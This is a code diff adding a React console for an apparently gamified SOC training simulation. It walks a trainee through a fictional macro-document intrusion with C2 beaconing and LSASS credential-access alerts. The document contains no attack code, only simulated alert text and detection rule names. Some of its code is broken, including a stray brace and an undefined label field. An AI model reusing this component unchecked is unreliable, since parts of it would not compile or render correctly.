+function SOCConsole({incId="INC-2026-0441",prog={xp:0,level:1,done:{}},addXP=()=>{},finishSim=()=>{},onBack=()=>{},submitFeedback=()=>{},analyst:analystProp,nav=()=>{},isGuest=false}){
+  const inc=INCIDENTS[incId]||INCIDENTS["INC-2026-0441"];
+  const scenarioData=Object.values(SCENARIOS).find(s=>s.incId===incId)||{};
+  if(!inc){return(<div style={{padding:40,color:"red",fontFamily:"monospace"}}>Incident {incId} not found</div>);}
+  const [activeTool,setActiveTool]=useState("siem");
+  const [si,setSi]=useState(0);
+  const [status,setStatus]=useState("ticket_review"); // ticket_review | mode_select | coach | decision | action_idle | action_running | action_done
+  const [mode,setMode]=useState(null); // "beginner" | "analyst"
+  const [decisionCorrect,setDecisionCorrect]=useState(null);
+  const selectMode=(m)=>{setMode(m);setStatus("coach");};
+  const [showStory,setShowStory]=useState(false);
+  const [storyText,setStoryText]=useState("");
+  const handleDecision=(correct)=>{
+    setDecisionCorrect(correct);
+    const capturedPhase = step?.phase;
+    const capturedXp = step?.xp||0;
+    const capturedSi = si;
+    setStatus("action_running");
+    setTimeout(()=>{
+      if(capturedPhase==="CONTAINMENT") setContained(true);
+      setDoneSteps(p=>[...p,capturedSi]);
+      setXpBurstAmt(capturedXp);
+      setStatus("action_done");
+    },1400);
+  };
+  const [doneSteps,setDoneSteps]=useState([]);
+  const [hintCount,setHintCount]=useState(0);
+  const [contained,setContained]=useState(false);
+  const [elapsed,setElapsed]=useState(0);
+  const [showScore,setShowScore]=useState(false);
+  const [showGuestModal,setShowGuestModal]=useState(false);
+  const [xpBurstAmt,setXpBurstAmt]=useState(null);
+
+  useEffect(()=>{const t=setInterval(()=>setElapsed(s=>s+1),1000);return()=>clearInterval(t);},[]);
+
+  const step=inc?.steps?.[si]||inc?.steps?.[0];
+  const pct=doneSteps.length===0?0:Math.round((doneSteps.length/inc.steps.length)*100);
+
+  const toolMap={
+    "BlueTrace SIEM":"siem",
+    "LearnThreatOpsEDR":"edr",
+    "ThreatLens":"ti",
+    "IncidentDesk":"desk",
+  };
+
+  const handleCoachClose=()=>{
+    setActiveTool(toolMap[step.tool]||"siem");
+    setStatus("action_idle");
+  };
+  // Auto-advance steps that have no decision question
+  useEffect(()=>{
+    if(status==="decision" && step && !step.decision){
+      handleDecision(true);
+    }
+  },[status]);
+
+  const handleBack=()=>{
+    if(si>0){
+      setDoneSteps(d=>d.filter(i=>i!==si-1));
+      setSi(s=>s-1);
+      setStatus("coach");
+      setActiveTool(toolMap[inc.steps[si-1]?.tool]||"siem");
+    } else {
+      onBack();
+    }
+  };
+
+  const handleAction=async()=>{
+    setStatus("action_running");
+    await new Promise(r=>setTimeout(r,1400));
+    if(step.phase==="CONTAINMENT") setContained(true);
+    setDoneSteps(p=>[...p,si]);
+    setXpBurstAmt(step.xp);
+    setStatus("action_done");
+    setTimeout(()=>setXpBurstAmt(null),2000);
+  };
+
+  const handleNext=()=>{
+    if(si<inc.steps.length-1){
+      if(isGuest && si===1){
+        setShowGuestModal(true);
+        return;
+      }
+      setSi(s=>s+1);
+      setStatus("coach");
+    } else {
+      // Add current step to done before finishing
+      const finalDone = doneSteps.includes(si) ? doneSteps : [...doneSteps, si];
+      const totalXP = finalDone.reduce((a,idx)=>{
+        const s = inc.steps[idx];
+        return a + (s?.xp||0);
+      }, 0);
+      const maxXP = inc.steps.reduce((a,s)=>a+(s?.xp||0),0);
+      const pct = maxXP>0 ? Math.round((totalXP/maxXP)*100) : 100;
+      const grade = pct>=95?"S":pct>=80?"A":pct>=65?"B":pct>=50?"C":"D";
+      addXP(totalXP);
+      finishSim(inc.id, totalXP, grade, elapsed);
+      setShowScore(true);
+    }
+  };
+
+  const mm=String(Math.floor(elapsed/60)).padStart(2,"0");
+  const ss2=String(elapsed%60).padStart(2,"0");
+
+  return(
+    <div className="soc-root" style={{height:"100vh",display:"flex",flexDirection:"column",background:"var(--bg)",overflow:"hidden"}}>
+      {showGuestModal&&<GuestSignupModal
+        nav={nav||onBack}
+        onContinue={()=>{setShowGuestModal(false);setSi(s=>s+1);setStatus("coach");}}
+        onSignup={()=>{if(nav)nav("signup");}}
+      />}
+      {showScore&&<ScoreModal inc={inc} steps={inc.steps} elapsed={elapsed} hintCount={hintCount} onBack={onBack}/>}
+      {/* Ticket Review Overlay — first thing analyst sees */}
+      {status==="ticket_review"&&(
+        <div style={{position:"fixed",inset:0,zIndex:500,background:"#0a0d14",display:"flex",flexDirection:"column",overflow:"hidden"}}>
+          <div style={{background:"#111318",borderBottom:"1px solid #1f2937",padding:"0 16px",height:44,display:"flex",alignItems:"center",justifyContent:"space-between",flexShrink:0}}>
+            <div style={{display:"flex",alignItems:"center",gap:8}}>
+              <div style={{width:8,height:8,borderRadius:"50%",background:"#dc2626",animation:"pulse 1.5s infinite"}}/>
+              <span style={{fontSize:11,fontWeight:700,color:"#f87171",fontFamily:"var(--mo)",letterSpacing:"0.1em"}}>INCIDENT QUEUE</span>
+            </div>
+            <div style={{fontSize:10,color:"#4b5563",fontFamily:"var(--mo)"}}>
+              {String(Math.floor(elapsed/60)).padStart(2,"0")}:{String(elapsed%60).padStart(2,"0")} elapsed
+            </div>
+          </div>
+          <div style={{flex:1,overflow:"auto",padding:"20px 16px",display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center"}}>
+            <div style={{maxWidth:500,width:"100%"}}>
+              <div style={{background:"#111318",border:"1px solid rgba(220,38,38,0.4)",borderRadius:14,overflow:"hidden",marginBottom:16,boxShadow:"0 0 40px rgba(220,38,38,0.06)"}}>
+                <div style={{background:"rgba(220,38,38,0.12)",borderBottom:"1px solid rgba(220,38,38,0.25)",padding:"12px 16px",display:"flex",alignItems:"center",gap:8}}>
+                  <div style={{width:7,height:7,borderRadius:"50%",background:"#dc2626",animation:"pulse 1.5s infinite",flexShrink:0}}/>
+                  <span style={{fontSize:10,fontWeight:700,color:"#f87171",fontFamily:"var(--mo)",letterSpacing:"0.1em",flex:1}}>P1 CRITICAL · {inc.id}</span>
+                </div>
+                <div style={{padding:"16px 18px"}}>
+                  <IncidentAnimation incId={inc.id}/>
+                  <div style={{fontSize:17,fontWeight:800,color:"#f9fafb",lineHeight:1.3,marginBottom:8,marginTop:8}}>{inc.title}</div>
+                  <div style={{fontSize:13,color:"#9ca3af",lineHeight:1.6,marginBottom:16}}>{inc.brief||scenarioData.brief||"Investigate this incident and determine: real attack or false positive?"}</div>
+                  <div style={{display:"flex",gap:8,flexWrap:"wrap",marginBottom:16}}>
+                    {[["Risk Score",inc.severity==="Critical"?"97/100":inc.severity==="High"?"78/100":"52/100",inc.severity==="Critical"?"#dc2626":"#f59e0b"],["Severity",inc.severity||"High",inc.severity==="Critical"?"#dc2626":"#f59e0b"],["Type",inc.type==="TP"?"True Positive":"Investigate",inc.type==="TP"?"#dc2626":"#22c55e"],["SLA","60 min","#f59e0b"]].map(([l,v,c])=>(
+                      <div key={l} style={{background:"rgba(255,255,255,0.04)",border:"1px solid rgba(255,255,255,0.08)",borderRadius:8,padding:"6px 12px",textAlign:"center"}}>
+                        <div style={{fontSize:13,fontWeight:700,color:c,fontFamily:"var(--mo)"}}>{v}</div>
+                        <div style={{fontSize:9,color:"#6b7280",fontFamily:"var(--mo)",textTransform:"uppercase",letterSpacing:"0.1em"}}>{l}</div>
+                      </div>
+                    ))}
+                  </div>
+                  <div style={{display:"flex",flexDirection:"column",gap:9,marginBottom:14}}>
+                    {[
+                      {time:"08:17",icon:"📧",text:"Finance workstation WS-CORP-FIN-044: user opened Invoice_Final.docm from unknown sender.",c:"#fbbf24"},
+                      {time:"08:17",icon:"⚡",text:"SIEM: 4 correlated alerts. Risk 97/100. Rules fired: C2_BEACON + LSASS_MEMORY_ACCESS.",c:"#f87171"},
+                      {time:"08:18",icon:"🖥",text:"EDR: WINWORD.EXE → cmd.exe → powershell.exe → svchost32.exe process chain detected.",c:"#f87171"},
+                      {time:"08:23",icon:"🚨",text:"Active: svchost32.exe beaconing to 203.0.113.47:443 every 30 seconds.",c:"#dc2626"},
+                    ].map((ev,i)=>(
+                      <div key={i} style={{display:"flex",gap:10,alignItems:"flex-start"}}>
+                        <div style={{flexShrink:0,width:44,textAlign:"right"}}>
+                          <div style={{fontSize:9,color:"#6b7280",fontFamily:"var(--mo)"}}>{ev.time}</div>
+                          <div style={{fontSize:16,marginTop:2}}>{ev.icon}</div>
+                        </div>
+                        <div style={{flex:1,borderLeft:"3px solid "+ev.c,background:"rgba(255,255,255,0.03)",borderRadius:"0 6px 6px 0",padding:"8px 10px"}}>
+                          <div style={{fontSize:12.5,color:"#e8ecf4",lineHeight:1.6}}>{ev.text}</div>
+                        </div>
+                      </div>
+                    ))}
+                  </div>
+                  <div style={{background:"rgba(26,86,219,0.12)",border:"1px solid rgba(26,86,219,0.3)",borderRadius:10,padding:"12px 14px",marginBottom:14}}>
+                    <div style={{fontSize:10,fontWeight:700,color:"#60a5fa",fontFamily:"var(--mo)",letterSpacing:"0.1em",marginBottom:5,textTransform:"uppercase"}}>Your job</div>
+                    <div style={{fontSize:14,color:"#e8ecf4",lineHeight:1.7,fontWeight:500}}>
+                      Is this a real attack or a false alarm? The attacker may be connected right now.
+                      Investigate using the tools below. Make the call.
+                    </div>
+                  </div>
+                  <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:7}}>
+                    {[{icon:"📊",d:"What alerts fired"},{icon:"🖥",d:"What ran on the machine"},{icon:"🔍",d:"Who is behind the IP"},{icon:"🎫",d:"Ticket and SLA"}].map(t=>(
+                      <div key={t.n} style={{background:"rgba(255,255,255,0.04)",border:"1px solid #1f2937",borderRadius:8,padding:"8px 10px",display:"flex",gap:8,alignItems:"center"}}>
+                        <span style={{fontSize:15,flexShrink:0}}>{t.icon}</span>
+                        <div><div style={{fontSize:11,fontWeight:700,color:"#f9fafb",fontFamily:"var(--mo)"}}>{t.n}</div><div style={{fontSize:9.5,color:"#6b7280"}}>{t.d}</div></div>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              </div>
+              <button onClick={()=>selectMode("beginner")} style={{width:"100%",background:"#dc2626",color:"#fff",padding:"15px",borderRadius:12,fontSize:15,fontWeight:800,border:"none",cursor:"pointer",boxShadow:"0 4px 20px rgba(220,38,38,0.35)"}}>
+                Start Investigating →
+              </button>
+              <div style={{textAlign:"center",marginTop:8,fontSize:11,color:"#374151"}}>
+                Training simulation · all data is fictional
+              </div>
+            </div>
+          </div>
+        </div>
+      )}}
+        {false&&<ModeSelector inc={inc} onSelect={selectMode}/>}
+      {status==="decision"&&step?.decision&&<DecisionQuestion step={step} onDecide={handleDecision}/>}
+      {/* auto-advance handled in useEffect below */}
+      {status==="coach"&&<CoachPopup step={step} onClose={handleCoachClose} onHint={()=>setHintCount(h=>h+1)} hintUsed={false} stepsDone={doneSteps.length} totalSteps={inc.steps.length} mode={mode}/>}
+      {(status==="action_idle"||status==="action_running"||status==="action_done")&&(
+        <ActionOverlay
+          step={step}
+          onConfirm={status==="action_done"
+            ? handleNext
+            : status==="action_idle"&&step?.decision
+              ? ()=>setStatus("decision")
+              : handleAction}
+          isRunning={status==="action_running"}
+          isDone={status==="action_done"}
+          xpBurst={xpBurstAmt}
+        />
+      )}
+
+      {/* XP burst */}
+      {xpBurstAmt&&(
+        <div style={{position:"fixed",top:"40%",left:"50%",transform:"translateX(-50%)",zIndex:600,animation:"xpburst 2s ease forwards",pointerEvents:"none",fontSize:20,fontWeight:800,color:"#22c55e",fontFamily:"var(--mo)",textShadow:"0 0 20px rgba(34,197,94,0.8)"}}>
+          +{xpBurstAmt} XP ⚡
+        </div>
+      )}
+
+      {/* TOP BAR */}
+      <div style={{background:"var(--bg2)",borderBottom:"1px solid var(--bd)",padding:"0 16px",height:48,display:"flex",alignItems:"center",gap:12,flexShrink:0,boxShadow:"var(--sh)"}}>
+        <div style={{display:"flex",gap:5,flexShrink:0}}>
+          <button onClick={onBack} style={{background:"var(--bg3)",color:"var(--tx3)",padding:"5px 9px",borderRadius:5,fontSize:11,border:"1px solid var(--bd)",cursor:"pointer"}}>← Exit</button>
+          {si>0&&status!=="coach"&&status!=="ticket_review"&&status!=="mode_select"&&(
+            <button onClick={handleBack} style={{background:"var(--bg3)",color:"var(--ac)",padding:"5px 9px",borderRadius:5,fontSize:11,border:"1px solid var(--acb)",cursor:"pointer"}}>↩ Prev Step</button>
+          )}
+        </div>
+        <div style={{flex:1,overflow:"hidden",marginLeft:4}}>
+          <div style={{fontSize:10,color:"var(--tx4)",fontFamily:"var(--mo)",marginBottom:1}}>{inc.id} · P1-Critical</div>
+          <div style={{fontSize:13,fontWeight:700,color:"var(--tx)",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{inc.title}</div>
+        </div>
+        <div style={{display:"flex",gap:8,alignItems:"center",flexShrink:0}}>
+          <div style={{background:"var(--bg3)",border:"1px solid var(--bd)",borderRadius:5,padding:"3px 9px",fontSize:10.5,fontFamily:"var(--mo)",color:"var(--tx2)",fontWeight:600}}>{mm}:{ss2}</div>
+          <div style={{background:"var(--bg3)",border:"1px solid var(--bd)",borderRadius:5,padding:"3px 9px",fontSize:10.5,fontFamily:"var(--mo)",color:"var(--ac)",fontWeight:600}}>Step {si+1}/{inc.steps.length}</div>
+          <div style={{background:contained?"var(--okl)":"var(--errl)",border:"1px solid "+(contained?"var(--okb)":"var(--errb)"),borderRadius:5,padding:"3px 9px",fontSize:10.5,fontFamily:"var(--mo)",fontWeight:600,color:contained?"var(--ok)":"var(--err)"}}>
+            {contained?"CONTAINED":"SIMULATED THREAT"}
+          </div>
+        </div>
+      </div>
+
+      {/* PROGRESS */}
+      <div style={{height:3,background:"var(--bg3)",flexShrink:0}}>
+        <div style={{height:"100%",width:pct+"%",background:"linear-gradient(90deg,var(--ac),#7c3aed)",transition:"width 0.6s ease"}}/>
+      </div>
+
+      {/* TOOL SWITCHER */}
+      <div style={{background:"#0a0d14",borderBottom:"1px solid var(--bd)",padding:"0 16px",height:40,display:"flex",alignItems:"center",gap:0,flexShrink:0,overflowX:"auto",WebkitOverflowScrolling:"touch"}}>
+        <span style={{fontSize:9,color:"var(--tx4)",fontFamily:"var(--mo)",marginRight:12,letterSpacing:"0.1em",textTransform:"uppercase",flexShrink:0}}>Tools</span>
+        {[
+          {id:"siem",label:"BlueTrace SIEM",color:"#3b82f6",shortLabel:"SIEM"},
+          {id:"edr",label:"LearnThreatOpsEDR",color:"#ef4444",shortLabel:"EDR"},
+          {id:"ti",label:"ThreatLens",color:"#8b5cf6",shortLabel:"INTEL"},
+          {id:"desk",label:"IncidentDesk",color:"#10b981",shortLabel:"DESK"},
+        ].map(t=>{
+          const isActive=activeTool===t.id;
+          const isStepTool=toolMap[step?.tool]===t.id;
+          return(
+            <button key={t.id} onClick={()=>setActiveTool(t.id)}
+              style={{padding:"0 14px",height:40,fontSize:11,fontWeight:isActive?700:500,color:isActive?t.color:"var(--tx4)",background:isActive?t.color+"18":"none",border:"none",borderBottom:isActive?"2px solid "+t.color:"2px solid transparent",cursor:"pointer",fontFamily:"var(--mo)",letterSpacing:"0.05em",transition:"all 0.13s",position:"relative",display:"flex",alignItems:"center",gap:5}}>
+              {t.shortLabel}
+              {isStepTool&&<span style={{width:6,height:6,borderRadius:"50%",background:t.color,animation:"pulse 1.5s ease-in-out infinite"}}/>}
+            </button>
+          );
+        })}
+        <div style={{flex:1}}/>
+        <div style={{display:"flex",gap:6}}>
+          {inc.steps.map((_,i)=>{
+            const d=doneSteps.includes(i),active=i===si;
+            const pc=phaseColor(inc.steps[i].phase);
+            return(
+              <div key={i} style={{width:8,height:8,borderRadius:"50%",background:d?pc:active?pc+"60":"var(--bg4)",border:"1px solid "+(d?pc:active?pc+"80":"var(--bd)"),transition:"all 0.3s"}}/>
+            );
+          })}
+        </div>
+      </div>
+
+      {/* MISSION STRIP — always visible */}
+      {status!=="ticket_review"&&status!=="coach"&&step&&(
+        <div style={{background:"#0a0d14",borderBottom:"1px solid rgba(255,255,255,0.06)",
+          padding:"8px 16px",flexShrink:0,display:"flex",alignItems:"center",gap:10}}>
+          <div style={{background:phaseColor(step.phase)+"20",border:"1px solid "+phaseColor(step.phase)+"40",
+            borderRadius:20,padding:"2px 9px",fontSize:9,fontWeight:700,
+            color:phaseColor(step.phase),fontFamily:"var(--mo)",
+            letterSpacing:"0.1em",whiteSpace:"nowrap",flexShrink:0}}>
+            {step.phase}
+          </div>
+          <div style={{width:1,height:12,background:"rgba(255,255,255,0.1)",flexShrink:0}}/>
+          <div style={{fontSize:12,fontWeight:600,color:"#e8ecf4",
+            flex:1,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>
+            {step.objective?.split(".")[0]}
+          </div>
+          <div style={{fontSize:10,fontWeight:600,color:"#6b7280",
+            fontFamily:"var(--mo)",flexShrink:0,whiteSpace:"nowrap"}}>
+            {(si||0)+1}/{inc.steps.length}
+          </div>
+        </div>
+      )}
+      {/* TOOL CONTENT */}
+      <div style={{flex:1,overflow:"hidden",display:"flex",paddingBottom:(status==="action_idle"||status==="action_running"||status==="action_done")?90:0}}>
+        {activeTool==="siem"&&<BlueTraceSIEM inc={inc} activeStep={status!=="coach"?step:null}/>}
+        {activeTool==="edr"&&<LearnThreatOpsEDR inc={inc} activeStep={status!=="coach"?step:null} isContained={contained}/>}
+        {activeTool==="ti"&&<ThreatLens inc={inc} activeStep={status!=="coach"?step:null}/>}
+        {activeTool==="desk"&&<IncidentDesk inc={inc} activeStep={status!=="coach"?step:null} stepsDone={doneSteps.length} analyst={analystProp||ANALYST} elapsed={elapsed}/>}
+      </div>
+    </div>
+  );
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// ROOT APP
+// ─────────────────────────────────────────────────────────────────────────────
+
+
+
+
+
+function Pill({children,color,sm}) {
+  const cols={
+    blue: {bg:"var(--acl)",  cl:"var(--ac)",  br:"var(--acb)" },
+    green:{bg:"var(--okl)",  cl:"var(--ok)",  br:"var(--okb)" },
+    amber:{bg:"var(--warnl)",cl:"var(--warn)",br:"var(--warnb)"},
+    red:  {bg:"var(--errl)", cl:"var(--err)", br:"var(--errb)" },
+    gray: {bg:"rgba(107,114,128,0.07)",cl:"var(--tx4)",br:"rgba(107,114,128,0.18)"},
+  };
+  const c=cols[color]||cols.gray;
+  return (
+    <span style={{background:c.bg,color:c.cl,border:"1px solid "+c.br,
+      padding:sm?"1px 7px":"2px 9px",borderRadius:20,
+      fontSize:sm?9:10.5,fontWeight:600,fontFamily:"var(--mo)",
+      letterSpacing:0.3,whiteSpace:"nowrap"}}>
+      {children}
+    </span>
+  );
+}
 
 
 function Tag({c}) {
